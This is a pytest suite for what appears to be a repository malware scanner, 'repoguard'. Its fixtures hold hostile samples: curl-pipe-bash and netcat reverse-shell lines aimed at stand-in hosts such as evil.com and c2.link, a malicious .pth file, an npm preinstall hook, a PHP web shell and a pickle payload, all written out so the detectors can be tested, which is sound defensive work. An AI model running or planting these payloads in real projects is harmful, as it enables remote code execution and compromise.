"""Tests for static code analysis, AST parsing, and pattern detection."""

import os
import pytest
import tempfile
from unittest.mock import patch
from repoguard.code_scanner import (
    scan_file,
    scan_directory,
    scan_python_file,
    clone_repo,
    _remove_readonly,
)
from repoguard.models import Severity


def test_ast_python_eval_exec():
    lines = [
        "x = 10",
        "eval('x + 1')",
        "exec('print(123)')",
    ]
    findings = scan_python_file("sample.py", "sample.py", lines)
    rules = [f.rule for f in findings]
    assert "PY-EXEC-EVAL" in rules
    assert len(findings) == 2


def test_ast_python_obfuscated_exec():
    lines = [
        "import base64",
        "exec(base64.b64decode('cHJpbnQoImhlbGxvIik='))",
    ]
    findings = scan_python_file("obf.py", "obf.py", lines)
    assert len(findings) == 1
    assert findings[0].severity == Severity.CRITICAL
    assert "decoded payload" in findings[0].description


def test_ast_python_insecure_deserialization():
    lines = [
        "import pickle",
        "import marshal",
        "import shelve",
        "import yaml",
        "data = pickle.loads(b'cos\\nsystem\\n(S\"id\"\\ntR.')",
        "m_data = marshal.loads(b'c')",
        "db = shelve.open('test.db')",
        "y = yaml.unsafe_load('bad')",
    ]
    findings = scan_python_file("deserialize.py", "deserialize.py", lines)
    rules = [f.rule for f in findings]
    assert "PY-UNSAFE-DESERIALIZATION" in rules
    assert len(findings) == 4


def test_ast_python_shell_execution():
    lines = [
        "import os",
        "import subprocess",
        "import pty",
        "os.system('whoami')",
        "subprocess.run(['ls', '-la'], shell=True)",
        "pty.spawn('/bin/sh')",
    ]
    findings = scan_python_file("shell_test.py", "shell_test.py", lines)
    rules = [f.rule for f in findings]
    assert "PY-OS-SHELL" in rules
    assert "PY-SUBPROCESS-SHELL" in rules
    assert "PY-PTY-SPAWN" in rules


def test_ast_dynamic_imports_and_ctypes():
    lines = [
        "import ctypes",
        "import socket",
        "libc = ctypes.CDLL('libc.so.6')",
        "mod = __import__('os')",
        "s = socket.socket()",
        "c = compile('print(1)', '<string>', 'exec')",
    ]
    findings = scan_python_file("native.py", "native.py", lines)
    rules = [f.rule for f in findings]
    assert "PY-CTYPES" in rules
    assert "PY-DYNAMIC-IMPORT" in rules
    assert "PY-RAW-SOCKET" in rules
    assert "PY-COMPILE" in rules


def test_ast_benign_python_clean():
    lines = [
        "import math",
        "def add(a, b):",
        "    return a + b",
        "print(add(2, 3))",
    ]
    findings = scan_python_file("clean.py", "clean.py", lines)
    assert len(findings) == 0


def test_syntax_error_fallback_to_regex():
    lines = [
        "def broken syntax (:",
        "curl https://evil.com/sh | bash",
    ]
    findings = scan_python_file("broken.py", "broken.py", lines)
    rules = [f.rule for f in findings]
    assert "SHELL-CURL-PIPE" in rules


def test_regex_reverse_shell_and_curl_pipe():
    with tempfile.TemporaryDirectory() as tmpdir:
        sh_path = os.path.join(tmpdir, "install.sh")
        with open(sh_path, "w", encoding="utf-8") as f:
            f.write("curl https://evil.com/payload.sh | bash\n")
            f.write("nc -e /bin/sh 10.0.0.1 4242\n")

        findings, _ = scan_file(sh_path, tmpdir)
        rules = [f.rule for f in findings]
        assert "SHELL-CURL-PIPE" in rules
        assert "SHELL-REVERSE-SHELL" in rules


def test_exposed_private_key():
    with tempfile.TemporaryDirectory() as tmpdir:
        key_path = os.path.join(tmpdir, "id_rsa")
        with open(key_path, "w", encoding="utf-8") as f:
            f.write("-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...\n-----END RSA PRIVATE KEY-----\n")

        findings, _ = scan_file(key_path, tmpdir)
        assert any(f.rule == "SECRET-PRIVATE-KEY" for f in findings)


def test_binary_executable_detection():
    with tempfile.TemporaryDirectory() as tmpdir:
        bin_path = os.path.join(tmpdir, "payload.exe")
        with open(bin_path, "wb") as f:
            f.write(b"MZ\x90\x00\x03\x00\x00\x00")

        findings, _ = scan_file(bin_path, tmpdir)
        assert any(f.rule == "BINARY-EXECUTABLE" for f in findings)


def test_directory_scan_ignores_git():
    with tempfile.TemporaryDirectory() as tmpdir:
        git_dir = os.path.join(tmpdir, ".git")
        os.makedirs(git_dir)
        with open(os.path.join(git_dir, "pack.so"), "wb") as f:
            f.write(b"\x7fELF")

        with open(os.path.join(tmpdir, "main.py"), "w", encoding="utf-8") as f:
            f.write("print('Hello RepoGuard')\n")

        scan = scan_directory(tmpdir)
        assert scan.scanned_files_count == 1
        assert scan.binary_files_count == 0
        assert len(scan.findings) == 0


def test_clone_repo_invalid_protocol():
    with pytest.raises(ValueError, match="Invalid repository URL protocol"):
        clone_repo("ftp://evil.com/repo", "dummy_dir")


def test_remove_readonly_helper():
    with tempfile.TemporaryDirectory() as tmpdir:
        test_file = os.path.join(tmpdir, "readonly.txt")
        with open(test_file, "w") as f:
            f.write("test")
        os.chmod(test_file, 0o444)
        _remove_readonly(os.remove, test_file, None)
        assert not os.path.exists(test_file)


# --- NEW COMPREHENSIVE SUPPLY CHAIN & INJECTION TESTS ---

def test_pth_file_code_execution():
    with tempfile.TemporaryDirectory() as tmpdir:
        pth_file = os.path.join(tmpdir, "evil.pth")
        with open(pth_file, "w", encoding="utf-8") as f:
            f.write("/usr/local/lib/site-packages\n")
            f.write("import os; os.system('curl http://c2.link/sh | bash')\n")

        findings, _ = scan_file(pth_file, tmpdir)
        assert any(f.rule == "PY-PTH-EXECUTION" for f in findings)
        assert any(f.severity == Severity.CRITICAL for f in findings)


def test_vscode_tasks_folder_open_autorun():
    with tempfile.TemporaryDirectory() as tmpdir:
        vscode_dir = os.path.join(tmpdir, ".vscode")
        os.makedirs(vscode_dir)
        tasks_file = os.path.join(vscode_dir, "tasks.json")
        with open(tasks_file, "w", encoding="utf-8") as f:
            f.write('{"version": "2.0.0", "tasks": [{"runOptions": {"runOn": "folderOpen"}, "command": "powershell"}]}')

        findings, _ = scan_file(tasks_file, tmpdir)
        assert any(f.rule == "IDE-TASKS-AUTORUN" for f in findings)
        assert any(f.severity == Severity.CRITICAL for f in findings)


def test_vscode_settings_interpreter_hijack():
    with tempfile.TemporaryDirectory() as tmpdir:
        vscode_dir = os.path.join(tmpdir, ".vscode")
        os.makedirs(vscode_dir)
        settings_file = os.path.join(vscode_dir, "settings.json")
        with open(settings_file, "w", encoding="utf-8") as f:
            f.write('{"python.defaultInterpreterPath": "./bin/fake_python.bat"}')

        findings, _ = scan_file(settings_file, tmpdir)
        assert any(f.rule == "IDE-INTERPRETER-HIJACK" for f in findings)
        assert any(f.severity == Severity.HIGH for f in findings)


def test_npm_package_json_lifecycle_hook():
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg_file = os.path.join(tmpdir, "package.json")
        with open(pkg_file, "w", encoding="utf-8") as f:
            f.write('{"name": "test", "scripts": {"preinstall": "node -e \'require(\\\"child_process\\\").exec(\\\"curl evil.com\\\")\'"}}')

        findings, _ = scan_file(pkg_file, tmpdir)
        assert any(f.rule == "NPM-LIFECYCLE-HOOK" for f in findings)
        assert any(f.severity == Severity.CRITICAL for f in findings)


def test_pip_dependency_confusion():
    with tempfile.TemporaryDirectory() as tmpdir:
        req_file = os.path.join(tmpdir, "requirements.txt")
        with open(req_file, "w", encoding="utf-8") as f:
            f.write("--extra-index-url http://untrusted-internal-repo.com/simple\nrequests>=2.0\n")

        findings, _ = scan_file(req_file, tmpdir)
        assert any(f.rule == "PIP-DEPENDENCY-CONFUSION" for f in findings)
        assert any(f.severity == Severity.HIGH for f in findings)


def test_setup_py_cmdclass_hook():
    with tempfile.TemporaryDirectory() as tmpdir:
        setup_file = os.path.join(tmpdir, "setup.py")
        with open(setup_file, "w", encoding="utf-8") as f:
            f.write("from setuptools import setup\nsetup(name='evil', cmdclass={'install': CustomInstall})\n")

        findings, _ = scan_file(setup_file, tmpdir)
        assert any(f.rule == "PY-SETUP-CMDCLASS-HOOK" for f in findings)


def test_docker_compose_host_mount_escape():
    with tempfile.TemporaryDirectory() as tmpdir:
        compose_file = os.path.join(tmpdir, "docker-compose.yml")
        with open(compose_file, "w", encoding="utf-8") as f:
            f.write("version: '3'\nservices:\n  app:\n    volumes:\n      - /:/host\n")

        findings, _ = scan_file(compose_file, tmpdir)
        assert any(f.rule == "DOCKER-HOST-MOUNT-ESCAPE" for f in findings)
        assert any(f.severity == Severity.CRITICAL for f in findings)


def test_trojan_source_bidi_override():
    with tempfile.TemporaryDirectory() as tmpdir:
        src_file = os.path.join(tmpdir, "auth.py")
        # Insert Unicode BiDi right-to-left override character U+202E
        with open(src_file, "w", encoding="utf-8") as f:
            f.write("is_admin = False\n# Check user access \u202e return True\n")

        findings, _ = scan_file(src_file, tmpdir)
        assert any(f.rule == "TROJAN-SOURCE-BIDI" for f in findings)
        assert any(f.severity == Severity.CRITICAL for f in findings)


def test_trojan_zero_width_steganography():
    with tempfile.TemporaryDirectory() as tmpdir:
        src_file = os.path.join(tmpdir, "util.py")
        # Insert Unicode zero-width space U+200B
        with open(src_file, "w", encoding="utf-8") as f:
            f.write("x = 'hello \u200b secret payload'\n")

        findings, _ = scan_file(src_file, tmpdir)
        assert any(f.rule == "TROJAN-ZERO-WIDTH" for f in findings)
        assert any(f.severity == Severity.HIGH for f in findings)


def test_ai_pickle_model_weights():
    with tempfile.TemporaryDirectory() as tmpdir:
        pkl_file = os.path.join(tmpdir, "weights.pkl")
        with open(pkl_file, "wb") as f:
            f.write(b"\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00.")

        findings, _ = scan_file(pkl_file, tmpdir)
        assert any(f.rule == "AI-UNSAFE-PICKLE-MODEL" for f in findings)


def test_committed_venv_directory():
    with tempfile.TemporaryDirectory() as tmpdir:
        venv_dir = os.path.join(tmpdir, "venv")
        os.makedirs(venv_dir)
        # Put clean dummy file
        with open(os.path.join(tmpdir, "script.py"), "w", encoding="utf-8") as f:
            f.write("print('clean')\n")

        scan = scan_directory(tmpdir)
        assert any(f.rule == "ENV-COMMITTED-VENV" for f in scan.findings)


def test_direnv_committed_envrc():
    with tempfile.TemporaryDirectory() as tmpdir:
        envrc_file = os.path.join(tmpdir, ".envrc")
        with open(envrc_file, "w", encoding="utf-8") as f:
            f.write("export PATH=$PWD/bin:$PATH\n")

        scan = scan_directory(tmpdir)
        assert any(f.rule == "DIRENV-COMMITTED-ENVRC" for f in scan.findings)


@patch("repoguard.code_scanner.subprocess.run")
def test_clone_repo_hardening_flags(mock_run):
    clone_repo("https://github.com/owner/repo", "target_dir")
    cmd = mock_run.call_args[0][0]
    assert "--no-recurse-submodules" in cmd
    assert "--config" in cmd
    assert "core.hooksPath=/dev/null" in cmd
    assert "core.symlinks=false" in cmd


def test_scan_golang_threats():
    with tempfile.TemporaryDirectory() as tmpdir:
        go_file = os.path.join(tmpdir, "main.go")
        with open(go_file, "w", encoding="utf-8") as f:
            f.write("package main\n// #cgo CFLAGS: -O2\nimport \"os/exec\"\nfunc main() { exec.Command(\"whoami\") }\n")

        findings, _ = scan_file(go_file, tmpdir)
        rules = [f.rule for f in findings]
        assert "GO-CGO-DIRECTIVE" in rules
        assert "GO-EXEC-COMMAND" in rules


def test_scan_rust_threats():
    with tempfile.TemporaryDirectory() as tmpdir:
        rs_file = os.path.join(tmpdir, "main.rs")
        with open(rs_file, "w", encoding="utf-8") as f:
            f.write("use std::process::Command;\nfn main() { Command::new(\"sh\").arg(\"-c\").output(); }\n")

        findings, _ = scan_file(rs_file, tmpdir)
        assert any(f.rule == "RUST-COMMAND-EXEC" for f in findings)


def test_scan_cpp_threats():
    with tempfile.TemporaryDirectory() as tmpdir:
        cpp_file = os.path.join(tmpdir, "loader.cpp")
        with open(cpp_file, "w", encoding="utf-8") as f:
            f.write("#include <stdlib.h>\nint main() { system(\"curl http://evil.com/sh | bash\"); }\n")

        findings, _ = scan_file(cpp_file, tmpdir)
        rules = [f.rule for f in findings]
        assert "CPP-SYSTEM-EXEC" in rules
        assert "SHELL-CURL-PIPE" in rules


def test_scan_java_threats():
    with tempfile.TemporaryDirectory() as tmpdir:
        java_file = os.path.join(tmpdir, "App.java")
        with open(java_file, "w", encoding="utf-8") as f:
            f.write("public class App { void test() { Runtime.getRuntime().exec(\"id\"); } }\n")

        findings, _ = scan_file(java_file, tmpdir)
        assert any(f.rule == "JAVA-PROCESS-EXEC" for f in findings)


def test_scan_csharp_threats():
    with tempfile.TemporaryDirectory() as tmpdir:
        cs_file = os.path.join(tmpdir, "Program.cs")
        with open(cs_file, "w", encoding="utf-8") as f:
            f.write("using System.Diagnostics;\nclass Program { static void Main() { Process.Start(\"cmd.exe\"); } }\n")

        findings, _ = scan_file(cs_file, tmpdir)
        assert any(f.rule == "CS-PROCESS-START" for f in findings)


def test_scan_php_threats():
    with tempfile.TemporaryDirectory() as tmpdir:
        php_file = os.path.join(tmpdir, "shell.php")
        with open(php_file, "w", encoding="utf-8") as f:
            f.write("<?php shell_exec($_GET['cmd']); ?>\n")

        findings, _ = scan_file(php_file, tmpdir)
        assert any(f.rule == "PHP-SHELL-EXEC" for f in findings)


def test_scan_ruby_threats():
    with tempfile.TemporaryDirectory() as tmpdir:
        rb_file = os.path.join(tmpdir, "app.rb")
        with open(rb_file, "w", encoding="utf-8") as f:
            f.write("system('whoami')\n")

        findings, _ = scan_file(rb_file, tmpdir)
        assert any(f.rule == "RUBY-COMMAND-EXEC" for f in findings)


def test_scan_javascript_threats():
    with tempfile.TemporaryDirectory() as tmpdir:
        js_file = os.path.join(tmpdir, "server.js")
        with open(js_file, "w", encoding="utf-8") as f:
            f.write("const cp = require('child_process'); cp.exec('id');\n")

        findings, _ = scan_file(js_file, tmpdir)
        assert any(f.rule == "JS-CHILD-PROCESS" for f in findings)
